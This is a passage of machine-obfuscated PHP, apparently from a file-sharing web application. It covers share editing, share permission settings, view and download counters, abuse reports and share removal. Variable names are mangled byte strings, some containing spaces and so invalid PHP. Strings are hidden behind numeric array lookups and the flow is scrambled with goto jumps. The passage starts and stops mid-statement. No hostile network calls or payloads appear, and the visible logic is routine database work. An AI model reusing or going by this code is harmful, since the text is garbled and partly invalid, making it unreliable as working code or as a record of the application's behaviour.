$Fâø…Õ‹ì[$BâËŠ˜ƒÀ“] = $B¾™ÇæÚÚ[$BâËŠ˜ƒÀ“]; } goto d¹ÔÕá…¿¤; aİ½ƒ†‹à: } private function _shareAuthSet($c§‰À˜ÃÑè, $FÏ†è× ­) { goto DáİíììÎ; DàÄŸ‡ŠÓæ: return $cµ ¨©Ğ->addAll($dçë¶ÈÀØñ, array(), !0); goto Fï©¼ÚŒåÑ; d™ªİÄ¸ Á: $cµ ¨©Ğ->where(array($c‡½Ø‡¾Ø[437] => $c§‰À˜ÃÑè))->delete(); $dçë¶ÈÀØñ = array(); foreach ($FÏ†è× ­ as $bÀ‹‡ƒ‹È) { $A¿ğšİÀñ = SourceModel::TYPE_USER; if ($bÀ‹‡ƒ‹È[$c‡½Ø‡¾Ø[368]] == SourceModel::TYPE_GROUP) { $A¿ğšİÀñ = SourceModel::TYPE_GROUP; } $BÍÊÊ±Ô° = array($c‡½Ø‡¾Ø[437] => $c§‰À˜ÃÑè, $c‡½Ø‡¾Ø[368] => $A¿ğšİÀñ, $c‡½Ø‡¾Ø[452] => intval($bÀ‹‡ƒ‹È[$c‡½Ø‡¾Ø[452]]), $c‡½Ø‡¾Ø[2144] => 0, $c‡½Ø‡¾Ø[2145] => -1); if ($bÀ‹‡ƒ‹È[$c‡½Ø‡¾Ø[2144]]) { $BÍÊÊ±Ô°[$c‡½Ø‡¾Ø[2144]] = $bÀ‹‡ƒ‹È[$c‡½Ø‡¾Ø[2144]]; } else { if ($bÀ‹‡ƒ‹È[$c‡½Ø‡¾Ø[2145]]) { $BÍÊÊ±Ô°[$c‡½Ø‡¾Ø[2145]] = $bÀ‹‡ƒ‹È[$c‡½Ø‡¾Ø[2145]]; } } $dçë¶ÈÀØñ[] = $BÍÊÊ±Ô°; } goto DàÄŸ‡ŠÓæ; DáİíììÎ: $c‡½Ø‡¾Ø =& $_SERVER[ì‹É]; if (!is_array($FÏ†è× ­)) { return !1; } $cµ ¨©Ğ = Model($c‡½Ø‡¾Ø[2143]); goto d™ªİÄ¸ Á; Fï©¼ÚŒåÑ: } public function numViewAdd($e†¤ŒÊ©ÙÆ) { $D¡øÕ¼Çù• =& $_SERVER[ì‹É]; $eâƒĞ„µ®ã = array($D¡øÕ¼Çù•[436] => $e†¤ŒÊ©ÙÆ); $this->where($eâƒĞ„µ®ã)->setAdd($D¡øÕ¼Çù•[2139]); } public function numDownloadAdd($e³³½Ÿäá·) { $D¨Åˆ”†˜• =& $_SERVER[ì‹É]; $AÇÆÌ‰†â = array($D¨Åˆ”†˜•[436] => $e³³½Ÿäá·); $this->where($AÇÆÌ‰†â)->setAdd($D¨Åˆ”†˜•[2140]); } protected function shareEdit($a„´ „İÄ‡, $BØ¦İä×äÅ) { goto a¸–Œ˜Íñ£; DÆÚîáÍ: $this->_checkLinkShare($BØ¦İä×äÅ, $D‡¨Œ ‚½÷); $b²…¿ğ«¢ã = array(); $fÖæ§‘‚™´ = explode($F¡ì»Ô[47], $F¡ì»Ô[2146]); goto F•à¯ƒÎØ¸; Dá“«¶ÊÕ•: if (isset($BØ¦İä×äÅ[$F¡ì»Ô[2132]])) { $this->_shareAuthSet($a„´ „İÄ‡, $BØ¦İä×äÅ[$F¡ì»Ô[2132]]); } return !0; goto C¾¤«Ô’ÅĞ; F•à¯ƒÎØ¸: foreach ($fÖæ§‘‚™´ as $D‹³ÓŞìÛ) { if (!array_key_exists($D‹³ÓŞìÛ, $BØ¦İä×äÅ)) { continue; } $b²…¿ğ«¢ã[$D‹³ÓŞìÛ] = $BØ¦İä×äÅ[$D‹³ÓŞìÛ]; } $this->shareEventAdd($D‡¨Œ ‚½÷[$F¡ì»Ô[366]], $BØ¦İä×äÅ, $F¡ì»Ô[1983]); $this->where(array($F¡ì»Ô[436] => $a„´ „İÄ‡))->save($b²…¿ğ«¢ã); goto Dá“«¶ÊÕ•; a¸–Œ˜Íñ£: $F¡ì»Ô =& $_SERVER[ì‹É]; $D‡¨Œ ‚½÷ = $this->getInfo($a„´ „İÄ‡); if (!$D‡¨Œ ‚½÷) { return !1; } goto DÆÚîáÍ; C¾¤«Ô’ÅĞ: } private function _checkLinkShare($aÊ¦·öªÒÊ, $AäÍ…Ö±±) { $F®ìŠ©éò =& $_SERVER[ì‹É]; if ($aÊ¦·öªÒÊ[$F®ìŠ©éò[442]] != $F®ìŠ©éò[84] || $AäÍ…Ö±±[$F®ìŠ©éò[388]][$F®ìŠ©éò[29]] != $F®ìŠ©éò[164]) { return; } $A¯ ™ªŸˆè = Model($F®ìŠ©éò[757])->fileInfoGet($AäÍ…Ö±±[$F®ìŠ©éò[388]][$F®ìŠ©éò[366]]); if (!$A¯ ™ªŸˆè) { return; } $dˆíé©Ê‰ = $this->shareFileMeta($A¯ ™ªŸˆè[$F®ìŠ©éò[415]]); if (isset($dˆíé©Ê‰[$F®ìŠ©éò[354]]) && $dˆíé©Ê‰[$F®ìŠ©éò[354]] == $F®ìŠ©éò[84]) { show_json(LNG($F®ìŠ©éò[2147]), !1); } } protected function remove($eÌ°»ø†‰) { goto A¾›×†Íà; A¾›×†Íà: $BšÈËêææ =& $_SERVER[ì‹É]; if (is_array($eÌ°»ø†‰)) { $eÌ°»ø†‰ = array($BšÈËêææ[7], $eÌ°»ø†‰); } $d‡¿ßµ÷÷ï = array($BšÈËêææ[437] => $eÌ°»ø†‰); goto fæôÄ¼·À; fæôÄ¼·À: $Då¥Ñ›Á = $this->where($d‡¿ßµ÷÷ï)->delete(); if ($Då¥Ñ›Á) { Model($BšÈËêææ[529])->where(array($BšÈËêææ[437] => $eÌ°»ø†‰))->delete(); } $A‘‹ÔœÔÚ¶ = is_array($eÌ°»ø†‰) ? $eÌ°»ø†‰[1] : array($eÌ°»ø†‰); goto fŒ¢Î†âÈÇ; fŒ¢Î†âÈÇ: for ($bÉïƒøÚîË = 0; $bÉïƒøÚîË < count($A‘‹ÔœÔÚ¶); $bÉïƒøÚîË++) { $EÏ§»Çï†¤ = $this->getInfo($A‘‹ÔœÔÚ¶[$bÉïƒøÚîË]); if ($EÏ§»Çï†¤[$BšÈËêææ[444]] == $BšÈËêææ[84]) { Model($BšÈËêææ[497])->eventShare($EÏ§»Çï†¤[$BšÈËêææ[366]], $BšÈËêææ[2137]); } if ($EÏ§»Çï†¤[$BšÈËêææ[442]] == $BšÈËêææ[84]) { Model($BšÈËêææ[497])->eventShare($EÏ§»Çï†¤[$BšÈËêææ[366]], $BšÈËêææ[2136]); } } return $Då¥Ñ›Á; goto DÖ¹óëÅÍ¦; DÖ¹óëÅÍ¦: } protected function removeBySource($eéÈ—ˆæÃé) { goto a‰…õŞñôš; Câ÷ÁÍŸƒœ: $Cºùª¬‡’Ú = array_to_keyvalue($Cºùª¬‡’Ú, $dÚÃ‚»ŠÉ†[33], $dÚÃ‚»ŠÉ†[437]); if (!$Cºùª¬‡’Ú) { return; } $BÛ’îçç = array($dÚÃ‚»ŠÉ†[436] => array($dÚÃ‚»ŠÉ†[381], $Cºùª¬‡’Ú)); goto a¦Ìöäá¿À; a¦Ìöäá¿À: $this->where($BÛ’îçç)->delete(); Model($dÚÃ‚»ŠÉ†[529])->where($BÛ’îçç)->delete(); goto FÁ»°É­Š; a‰…õŞñôš: $dÚÃ‚»ŠÉ† =& $_SERVER[ì‹É]; $BÛ’îçç = array($dÚÃ‚»ŠÉ†[380] => array($dÚÃ‚»ŠÉ†[381], $eéÈ—ˆæÃé)); $Cºùª¬‡’Ú = $this->field($dÚÃ‚»ŠÉ†[437])->where($BÛ’îçç)->select(); goto Câ÷ÁÍŸƒœ; FÁ»°É­Š: } public function listAll($DíÔÆí³³Ò) { goto cÍ‰ğóÄĞŸ; B®äÆ¸¿½Š: $aŠ¥ŸÍ¦Ù› = $this->_makeOrder()->where($DŠ˜åÇÆ)->selectPage(20); if (empty($aŠ¥ŸÍ¦Ù›[$A°¥¢ôŞöÍ[350]])) { return array(); } $this->_listDataApply($aŠ¥ŸÍ¦Ù›[$A°¥¢ôŞöÍ[350]]); goto B‰Œîø„··; EŠÀÃŠµØâ: if ($DíÔÆí³³Ò[$A°¥¢ôŞöÍ[689]]) { $E¿Ìğè©÷Ã = $DíÔÆí³³Ò[$A°¥¢ôŞöÍ[690]] ? $DíÔÆí³³Ò[$A°¥¢ôŞöÍ[690]] : strtotime(date($A°¥¢ôŞöÍ[2148])); $DŠ˜åÇÆ[$A°¥¢ôŞöÍ[184]] = array($A°¥¢ôŞöÍ[318], array($DíÔÆí³³Ò[$A°¥¢ôŞöÍ[689]], $E¿Ìğè©÷Ã)); } if ($DíÔÆí³³Ò[$A°¥¢ôŞöÍ[29]]) { $DŠ˜åÇÆ[$DíÔÆí³³Ò[$A°¥¢ôŞöÍ[29]]] = 1; } else { $DŠ˜åÇÆ[] = array($A°¥¢ôŞöÍ[442] => array($A°¥¢ôŞöÍ[923], 0), $A°¥¢ôŞöÍ[444] => array($A°¥¢ôŞöÍ[923], 0), $A°¥¢ôŞöÍ[2127] => $A°¥¢ôŞöÍ[2096]); } if ($DíÔÆí³³Ò[$A°¥¢ôŞöÍ[2092]]) { $DŠ˜åÇÆ[] = array($A°¥¢ôŞöÍ[439] => $DíÔÆí³³Ò[$A°¥¢ôŞöÍ[2092]], $A°¥¢ôŞöÍ[1248] => array($A°¥¢ôŞöÍ[756], "\45{$DíÔÆí³³Ò[$A°¥¢ôŞöÍ[2092]]}\x25"), $A°¥¢ôŞöÍ[2127] => $A°¥¢ôŞöÍ[2096]); } goto B®äÆ¸¿½Š; B‰Œîø„··: return $aŠ¥ŸÍ¦Ù›; goto A•›´¡¸ñ½; cÍ‰ğóÄĞŸ: $A°¥¢ôŞöÍ =& $_SERVER[ì‹É]; $DŠ˜åÇÆ = array(); if ($DíÔÆí³³Ò[$A°¥¢ôŞöÍ[1351]]) { $DŠ˜åÇÆ[$A°¥¢ôŞöÍ[1351]] = $DíÔÆí³³Ò[$A°¥¢ôŞöÍ[1351]]; } goto EŠÀÃŠµØâ; A•›´¡¸ñ½: } private function _listDataApply(&$Få«½óòë) { $DïˆëÛ‹äó =& $_SERVER[ì‹É]; $A¶õùÅÕ‡ = array_to_keyvalue($Få«½óòë, $DïˆëÛ‹äó[33], $DïˆëÛ‹äó[1351]); $b×Š‚ï¤„¢ = Model($DïˆëÛ‹äó[469])->userListInfo(array_unique($A¶õùÅÕ‡)); $aİ æïˆô = array_to_keyvalue($Få«½óòë, $DïˆëÛ‹äó[33], $DïˆëÛ‹äó[366]); $DÅÄ¢Ç†ï™ = Model($DïˆëÛ‹äó[757])->sourceListInfo($aİ æïˆô, !0); foreach ($Få«½óòë as &$c¿˜³µì¤‹) { $a£½©º‡Ú¼ = $c¿˜³µì¤‹[$DïˆëÛ‹äó[1351]]; $c¿˜³µì¤‹[$DïˆëÛ‹äó[2149]] = $b×Š‚ï¤„¢[$a£½©º‡Ú¼] ? $b×Š‚ï¤„¢[$a£½©º‡Ú¼] : !1; $aä×“«Ğ… = $c¿˜³µì¤‹[$DïˆëÛ‹äó[366]]; $c¿˜³µì¤‹[$DïˆëÛ‹äó[388]] = $DÅÄ¢Ç†ï™[$aä×“«Ğ…] ? $DÅÄ¢Ç†ï™[$aä×“«Ğ…] : !1; } } private function _makeOrder($e˜†Ó™Šñ» = '') { goto Dôè¢ÛªÏš; bŸ‚ˆ°ÀÌ: $e˜†Ó™Šñ» = $e˜†Ó™Šñ» . "{$f­¿’Ğ‚‚Û}\40{$d«Ë¥‹ö…ù}"; return $this->order($e˜†Ó™Šñ»); goto FÙ®ìÛç¥ê; Dôè¢ÛªÏš: $c‘‰Õå˜ÊÍ =& $_SERVER[ì‹É]; $AËõÒÈ ï = array($c‘‰Õå˜ÊÍ[184], $c‘‰Õå˜ÊÍ[690], $c‘‰Õå˜ÊÍ[2139], $c‘‰Õå˜ÊÍ[2140]); $E“÷¹±„«­ = array($c‘‰Õå˜ÊÍ[398] => $c‘‰Õå˜ÊÍ[399], $c‘‰Õå˜ÊÍ[400] => $c‘‰Õå˜ÊÍ[401]); goto cŞ½Ùó÷Ø; cŞ½Ùó÷Ø: $f­¿’Ğ‚‚Û = Input::get($c‘‰Õå˜ÊÍ[403], $c‘‰Õå˜ÊÍ[7], $c‘‰Õå˜ÊÍ[386], $AËõÒÈ ï); $d«Ë¥‹ö…ù = Input::get($c‘‰Õå˜ÊÍ[404], $c‘‰Õå˜ÊÍ[7], $c‘‰Õå˜ÊÍ[2150], array($c‘‰Õå˜ÊÍ[2091], $c‘‰Õå˜ÊÍ[400])); $d«Ë¥‹ö…ù = $E“÷¹±„«­[$d«Ë¥‹ö…ù]; goto bŸ‚ˆ°ÀÌ; FÙ®ìÛç¥ê: } public function reportAdd($aµ¦èí²‘é) { $fùÉ­Ê÷¤ =& $_SERVER[ì‹É]; $e–†óÇò = array($fùÉ­Ê÷¤[437] => $aµ¦èí²‘é[$fùÉ­Ê÷¤[437]], $fùÉ­Ê÷¤[1351] => USER_ID); if (Model($fùÉ­Ê÷¤[2151])->where($e–†óÇò)->find()) { return !1; } $A¶à¤õ‰Äˆ = array($fùÉ­Ê÷¤[437] => $aµ¦èí²‘é[$fùÉ­Ê÷¤[437]], $fùÉ­Ê÷¤[1248] => $aµ¦èí²‘é[$fùÉ­Ê÷¤[1248]], $fùÉ­Ê÷¤[366] => $aµ¦èí²‘é[$fùÉ­Ê÷¤[366]], $fùÉ­Ê÷¤[415] => $aµ¦èí²‘é[$fùÉ­Ê÷¤[415]], $fùÉ­Ê÷¤[1351] => USER_ID, $fùÉ­Ê÷¤[29] => $aµ¦èí²‘é[$fùÉ­Ê÷¤[29]], $fùÉ­Ê÷¤[401] => $aµ¦èí²‘é[$fùÉ­Ê÷¤[401]]); return Model($fùÉ­Ê÷¤[2151])->add($A¶à¤õ‰Äˆ); } public function reportList($fµ¥Ğñóš‚) { goto f¶ÖÁÌ‘õš; fì­¡˜ÅĞ‹: $f¿Ì†¨ÇÆ = array($D¢‚¶£©¨¨[398] => $D¢‚¶£©¨¨[399], $D¢‚¶£©¨¨[400] => $D¢‚¶£©¨¨[401]); $B›Ñ²Ÿæ§å = $D¢‚¶£©¨¨[2155] . $f¿Ì†¨ÇÆ[$B™êÖÏÖ¼]; $e«×³ã¥àŞ = Model($D¢‚¶£©¨¨[2151])->where($E ‹»ªùéÉ)->order($B›Ñ²Ÿæ§å)->selectPage(20); goto CÌîßõ—«®; f¶ÖÁÌ‘õš: $D¢‚¶£©¨¨ =& $_SERVER[ì‹É]; $E ‹»ªùéÉ = array(); if ($fµ¥Ğñóš‚[$D¢‚¶£©¨¨[689]]) { $eèÃ­éİêË = $fµ¥Ğñóš‚[$D¢‚¶£©¨¨[690]] ? $fµ¥Ğñóš‚[$D¢‚¶£©¨¨[690]] : strtotime(date($D¢‚¶£©¨¨[2148])); $E ‹»ªùéÉ[$D¢‚¶£©¨¨[184]] = array($D¢‚¶£©¨¨[318], array($fµ¥Ğñóš‚[$D¢‚¶£©¨¨[689]], $eèÃ­éİêË)); } goto Cœ¨ò©ä×—; Cœ¨ò©ä×—: if (isset($fµ¥Ğñóš‚[$D¢‚¶£©¨¨[29]]) && in_array($fµ¥Ğñóš‚[$D¢‚¶£©¨¨[29]], array($D¢‚¶£©¨¨[84], $D¢‚¶£©¨¨[2152], $D¢‚¶£©¨¨[2153], $D¢‚¶£©¨¨[2154], $D¢‚¶£©¨¨[1831]))) { $E ‹»ªùéÉ[$D¢‚¶£©¨¨[29]] = $fµ¥Ğñóš‚[$D¢‚¶£©¨¨[29]]; } if (isset($fµ¥Ğñóš‚[$D¢‚¶£©¨¨[676]]) && in_array($fµ¥Ğñóš‚[$D¢‚¶£©¨¨[676]], array($D¢‚¶£©¨¨[464], $D¢‚¶£©¨¨[84], $D¢‚¶£©¨¨[2152], $D¢‚¶£©¨¨[2153]))) { $E ‹»ªùéÉ[$D¢‚¶£©¨¨[676]] = $fµ¥Ğñóš‚[$D¢‚¶£©¨¨[676]]; } $B™êÖÏÖ¼ = Input::get($D¢‚¶£©¨¨[404], $D¢‚¶£©¨¨[7], $D¢‚¶£©¨¨[2150], array($D¢‚¶£©¨¨[2091], $D¢‚¶£©¨¨[400])); goto fì­¡˜ÅĞ‹; CÌîßõ—«®: if (empty($e«×³ã¥àŞ[$D¢‚¶£©¨¨[350]])) { return array(); } $this->_listDataApply($e«×³ã¥àŞ[$D¢‚¶£©¨¨[350]]); return $e«×³ã¥àŞ; goto dù„Ìæ ‘à; dù„Ìæ ‘à: } public function reportStatus($F­â¨‘”çĞ) { goto f•ÀßÙ‰Áš; f•ÀßÙ‰Áš: $B’­Œç£åÂ =& $_SERVER[ì‹É]; $b­Ù°÷Ïãá = array($B’­Œç£åÂ[364] => $F­â¨‘”çĞ[$B’­Œç£åÂ[364]]); $fâßºêï = Model($B’­Œç£åÂ[2151])->where($b­Ù°÷Ïãá)->field($B’­Œç£åÂ[2156])->find(); goto fáÓ·×®¯®; fÁÇ–­ÑÂ: return $eºº¾Ù˜Á; goto b„ÆŒèìêŒ; bÚøù­íà§: $eºº¾Ù˜Á = Model($B’­Œç£åÂ[2151])->where($b­Ù°÷Ïãá)->save($c¯ğ·‚ƒîè); if ($F­â¨‘”çĞ[$B’­Œç£åÂ[676]] == $B’­Œç£åÂ[2152]) { if ($fâßºêï[$B’­Œç£åÂ[415]] != $B’­Œç£åÂ[464] && $this->shareFileMeta($fâßºêï[$B’­Œç£åÂ[415]])) { $this->shareFileMeta($fâßºêï[$B’­Œç£åÂ[415]], 0); } return $this->remove($fâßºêï[$B’­Œç£åÂ[437]]); } if ($eºº¾Ù˜Á && $F­â¨‘”çĞ[$B’­Œç£åÂ[676]] == $B’­Œç£åÂ[2153]) { $F½Ãååöá = $c¯ğ·‚ƒîè[$B’­Œç£åÂ[676]] == $B’­Œç£åÂ[2153] ? 1 : 0; $this->shareFileMeta($fâßºêï[$B’­Œç£åÂ[415]], $F½Ãååöá); $this->removeByFile($fâßºêï[$B’­Œç£åÂ[415]]); } goto fÁÇ–­ÑÂ; fáÓ·×®¯®: if (!$fâßºêï) { return !1; } $c¯ğ·‚ƒîè = array($B’­Œç£åÂ[676] => $F­â¨‘”çĞ[$B’­Œç£åÂ[676]]); if ($F­â¨‘”çĞ[$B’­Œç£åÂ[676]] == $B’­Œç£åÂ[2153] && $fâßºêï[$B’­Œç£åÂ[676]] == $B’­Œç£åÂ[2153]) { $c¯ğ·‚ƒîè[$B’­Œç£åÂ[676]] = 0; } goto bÚøù­íà§; b„ÆŒèìêŒ: } private function removeByFile($aÄŠŸß‡ë¤) { goto c‚ã©¼ ‹å; c‚ã©¼ ‹å: $fÌ«á©š =& $_SERVER[ì‹É]; $fÕÍ¾·Ò = Model($fÌ«á©š[757])->where(array($fÌ«á©š[415] => $aÄŠŸß‡ë¤))->field($fÌ«á©š[366])->select(); $b×³‚‘İõ  = array_to_keyvalue($fÕÍ¾·Ò, $fÌ«á©š[33], $fÌ«á©š[366]); goto c‹èÕ“ç›; E£ğŞ„Ğî¡: $this->remove($Dé‚˜ãÆÒ†); goto E¨åÇ²›Ç; c‹èÕ“ç›: $AØš×Îö›œ = array($fÌ«á©š[366] => array($fÌ«á©š[7], $b×³‚‘İõ ), $fÌ«á©š[442] => 1); $fÕÍ¾·Ò = Model($fÌ«á©š[1991])->where($AØš×Îö›œ)->field($fÌ«á©š[437])->select(); $Dé‚˜ãÆÒ† = array_to_keyvalue($fÕÍ¾·Ò, $fÌ«á©š[33], $fÌ«á©š[437]); goto E£ğŞ„Ğî¡; E¨åÇ²›Ç: } private function shareFileMeta($EæÍš×ÀÊÅ, $E‹ÚãëŒ‰Ù = null) { $AØÊ´…ÒŒ =& $_SERVER[ì‹É]; $C«Ê‚µ‚İ = array($AØÊ´…ÒŒ[415] => $EæÍš×ÀÊÅ, $AØÊ´…ÒŒ[90] => $AØÊ´…ÒŒ[2157]); if (is_null($E‹ÚãëŒ‰Ù)) { return Model($AØÊ´…ÒŒ[2158])->where($C«Ê‚µ‚İ)->find(); } $C«Ê‚µ‚İ[$AØÊ´…ÒŒ[354]] = $E‹ÚãëŒ‰Ù; Model($AØÊ´…ÒŒ[2158])->add($C«Ê‚µ‚İ, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\x6f\137\x73\157\165\x72\143\145\137\141\x75\x74\x68"; public function getAuth($A¤ø–‡ÑÃ‘) { goto fÃµ÷®í¨; f½„£ãÛ™Ä: $Bó§ˆÏ×„Ê = $this->field($Bã£ø©•¤×)->order($CÍø¶Œ®ºã[364])->where($E½ô—ÕŠ»ƒ)->select(); $d£²®Š»Îß = array(); foreach ($Bó§ˆÏ×„Ê as $B‰ÑÙ„Õ¼Â) { if (Model($CÍø¶Œ®ºã[2160])->listData($B‰ÑÙ„Õ¼Â[$CÍø¶Œ®ºã[2144]])) { $d£²®Š»Îß[] = $B‰ÑÙ„Õ¼Â; } } goto C»¤ªÜ…áÖ; C»¤ªÜ…áÖ: return $d£²®Š»Îß; goto F®ïÉæ¾¤ö; fÃµ÷®í¨: $CÍø¶Œ®ºã =& $_SERVER[ì‹É]; $Bã£ø©•¤× = $CÍø¶Œ®ºã[2159]; $E½ô—ÕŠ»ƒ = array($CÍø¶Œ®ºã[366] => $A¤ø–‡ÑÃ‘); goto f½„£ãÛ™Ä; F®ïÉæ¾¤ö: } public function setAuth($bå„õŒÉéò, $eø¨³ø„¿) { goto D²†°–”¾Ğ; d¢Çà÷ÊŒŞ: $EƒÇŒøÌå = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $fè“…Ê–ïÏ = array(); foreach ($eø¨³ø„¿ as $BÓ«ÁÕÒàß) { if (!in_array($BÓ«ÁÕÒàß[$DºËáÈõ¾’[368]], $EƒÇŒøÌå)) { show_json(LNG($DºËáÈõ¾’[2161]), !1); } if ($fÑ™¤…¢³ != $c ÂãÓ¤é•) { if ($BÓ«ÁÕÒàß[$DºËáÈõ¾’[368]] == SourceModel::TYPE_GROUP) { } if ($BÓ«ÁÕÒàß[$DºËáÈõ¾’[452]] != 0 && !in_array($BÓ«ÁÕÒàß[$DºËáÈõ¾’[452]], $Aù£”ĞïÄ)) { } } if ($BÓ«ÁÕÒàß[$DºËáÈõ¾’[452]] == 0) { $BÓ«ÁÕÒàß[$DºËáÈõ¾’[368]] = SourceModel::TYPE_USER; } $fè“…Ê–ïÏ[] = array($DºËáÈõ¾’[366] => $bå„õŒÉéò, $DºËáÈõ¾’[368] => intval($BÓ«ÁÕÒàß[$DºËáÈõ¾’[368]]), $DºËáÈõ¾’[452] => intval($BÓ«ÁÕÒàß[$DºËáÈõ¾’[452]]), $DºËáÈõ¾’[2144] => intval($BÓ«ÁÕÒàß[$DºËáÈõ¾’[2144]]) ? intval($BÓ«ÁÕÒàß[$DºËáÈõ¾’[2144]]) : 0, $DºËáÈõ¾’[2145] => intval($BÓ«ÁÕÒàß[$DºËáÈõ¾’[2145]]) ? intval($BÓ«ÁÕÒàß[$DºËáÈõ¾’[2145]]) : -1); } goto bé©“¶ŒÌ; a²­òñ½Ğ: $c ÂãÓ¤é• = 1; $fÑ™¤…¢³ = $FÛê¹Ëàî[$DºËáÈõ¾’[452]]; if ($fÑ™¤…¢³ != $c ÂãÓ¤é•) { $aÙˆê†æ¦ì = array($DºËáÈõ¾’[2014] => $fÑ™¤…¢³); $Aù£”ĞïÄ = Model($DºËáÈõ¾’[2090])->field($DºËáÈõ¾’[1351])->where($aÙˆê†æ¦ì)->select(); $Aù£”ĞïÄ = array_to_keyvalue($Aù£”ĞïÄ, $DºËáÈõ¾’[33], $DºËáÈõ¾’[1351]); } goto d¢Çà÷ÊŒŞ; D²†°–”¾Ğ: $DºËáÈõ¾’ =& $_SERVER[ì‹É]; $FÛê¹Ëàî = Model($DºËáÈõ¾’[1083])->sourceInfo($bå„õŒÉéò); if ($FÛê¹Ëàî[$DºËáÈõ¾’[368]] != SourceModel::TYPE_GROUP) { return !1; } goto a²­òñ½Ğ; bé©“¶ŒÌ: $this->where(array($DºËáÈõ¾’[380] => $bå„õŒÉéò))->delete(); $this->addAll($fè“…Ê–ïÏ); return !0; goto cÓ¹¼‹î; cÓ¹¼‹î: } public function authClear($b”ÛËØ Ë®) { $d’ÃÜ›Å¨ò =& $_SERVER[ì‹É]; $Eâ‚‚·Œ¶¾ = Model($d’ÃÜ›Å¨ò[1083])->sourceInfo($b”ÛËØ Ë®); $C‹–ŒŞØè– = array($b”ÛËØ Ë®); if ($Eâ‚‚·Œ¶¾[$d’ÃÜ›Å¨ò[367]] == $d’ÃÜ›Å¨ò[84]) { $Fğ°ííö÷Ñ = array($d’ÃÜ›Å¨ò[517] => array($d’ÃÜ›Å¨ò[475], $Eâ‚‚·Œ¶¾[$d’ÃÜ›Å¨ò[455]] . $b”ÛËØ Ë® . $d’ÃÜ›Å¨ò[476])); $C‹–ŒŞØè– = Model($d’ÃÜ›Å¨ò[1083])->field($d’ÃÜ›Å¨ò[380])->where($Fğ°ííö÷Ñ)->getField($d’ÃÜ›Å¨ò[366], !0); $C‹–ŒŞØè–[] = $b”ÛËØ Ë®; } $this->where(array($d’ÃÜ›Å¨ò[380] => array($d’ÃÜ›Å¨ò[381], $C‹–ŒŞØè–)))->delete(); return !0; } public function get($CËæºê›„§) { $BÈÊçëêõ¸ = $this->getSourceList(array($CËæºê›„§), !0); return $BÈÊçëêõ¸[0]; } public function getSourceList($b••˜ÒºˆŠ, $CĞ¥ñĞßŒî = false) { goto f•¶¡âÃ¦Ğ; f•¶¡âÃ¦Ğ: $B–À¾‘®° =& $_SERVER[ì‹É]; if (!$b••˜ÒºˆŠ) { return array(); } $A‚ºÖ±Ö„¦ = Model($B–À¾‘®°[1083]); goto EÀÜÔÛŞø®; f—Éˆíä: $FÆŸ¬î±–Í = array($B–À¾‘®°[380] => array($B–À¾‘®°[381], $f¯•èØ²Ñ¶)); $A®äÊªˆ¸¥ = $this->field($eĞ‰Õãø¡³)->where($FÆŸ¬î±–Í)->select(); $A®äÊªˆ¸¥ = array_to_keyvalue_group($A®äÊªˆ¸¥, $B–À¾‘®°[366]); goto E‹¸¤ŒËÚ; E‹¸¤ŒËÚ: $aÑ¿ŞäÃƒÕ = array(); foreach ($CĞ¥ñĞßŒî as $eÚãÕØ²ÒÜ => $EÇ¹ˆÀå¿í) { $aÑ¿ŞäÃƒÕ[$eÚãÕØ²ÒÜ] = $this->makeSourceAuth($EÇ¹ˆÀå¿í, $A®äÊªˆ¸¥); } return $aÑ¿ŞäÃƒÕ; goto AˆÛ¤‘Ç•÷; EÀÜÔÛŞø®: if (!$CĞ¥ñĞßŒî) { $FÆŸ¬î±–Í = array($B–À¾‘®°[380] => array($B–À¾‘®°[381], $b••˜ÒºˆŠ)); $CĞ¥ñĞßŒî = $A‚ºÖ±Ö„¦->field($B–À¾‘®°[2162])->where($FÆŸ¬î±–Í)->select(); $CĞ¥ñĞßŒî = array_to_keyvalue($CĞ¥ñĞßŒî, $B–À¾‘®°[366]); } $f¯•èØ²Ñ¶ = $b••˜ÒºˆŠ; foreach ($CĞ¥ñĞßŒî as $CÁÉ‡çööÓ => $dÌ÷İŒó„œ) { $d¡à»¯ğ¨§ = $A‚ºÖ±Ö„¦->parentLevelArray($dÌ÷İŒó„œ[$B–À¾‘®°[455]]); $f¯•èØ²Ñ¶ = array_merge($f¯•èØ²Ñ¶, $d¡à»¯ğ¨§, array($CÁÉ‡çööÓ)); } goto dŞÇË÷›¼˜; dŞÇË÷›¼˜: $f¯•èØ²Ñ¶ = array_values(array_unique($f¯•èØ²Ñ¶)); if (!$f¯•èØ²Ñ¶) { return array(); } $eĞ‰Õãø¡³ = $B–À¾‘®°[2163]; goto f—Éˆíä; AˆÛ¤‘Ç•÷: } public function authDeepCheck($C»Ü¹©Äà×, $d³ƒ°¾»Íñ = false) { $bÃáíäÔ–É =& $_SERVER[ì‹É]; if ($GLOBALS[$bÃáíäÔ–É[453]]) { return !1; } $dšÍ¼¦“ï = $this->makeAuthDeep(); if (!in_array($C»Ü¹©Äà×, $dšÍ¼¦“ï)) { return !1; } return array($bÃáíäÔ–É[374] => -1, $bÃáíäÔ–É[414] => array($bÃáíäÔ–É[382] => $bÃáíäÔ–É[1005], $bÃáíäÔ–É[2020] => $bÃáíäÔ–É[464], $bÃáíäÔ–É[383] => LNG($bÃáíäÔ–É[2164]), $bÃáíäÔ–É[2032] => $bÃáíäÔ–É[2165])); } protected function makeAuthDeep() { goto C˜ä´ØæÚ; fÅÒŒîÎ: $e§ˆ˜Šâ¸â = Session::get($b‚º‰º÷¥¾[2128]); $e§ˆ˜Šâ¸â = array_to_keyvalue($e§ˆ˜Šâ¸â, $b‚º‰º÷¥¾[33], $b‚º‰º÷¥¾[2014]); $B„‚Š• = array($b‚º‰º÷¥¾[368] => SourceModel::TYPE_USER, $b‚º‰º÷¥¾[452] => USER_ID); goto aâ÷´†ƒŸò; aâ÷´†ƒŸò: if ($e§ˆ˜Šâ¸â) { $B„‚Š• = array(array($b‚º‰º÷¥¾[368] => SourceModel::TYPE_USER, $b‚º‰º÷¥¾[452] => USER_ID), array($b‚º‰º÷¥¾[368] => SourceModel::TYPE_GROUP, $b‚º‰º÷¥¾[452] => array($b‚º‰º÷¥¾[381], $e§ˆ˜Šâ¸â)), $b‚º‰º÷¥¾[911] => $b‚º‰º÷¥¾[2096]); } if ($bî®ô’´ßÃ) { $B„‚Š• = array($B„‚Š•, $b‚º‰º÷¥¾[2144] => array($b‚º‰º÷¥¾[2167], $bî®ô’´ßÃ)); } $FÖ„´Ëš = $this->field($b‚º‰º÷¥¾[2168])->where($B„‚Š•)->select(); goto AƒÜù¶ÎÚ–; C˜ä´ØæÚ: $b‚º‰º÷¥¾ =& 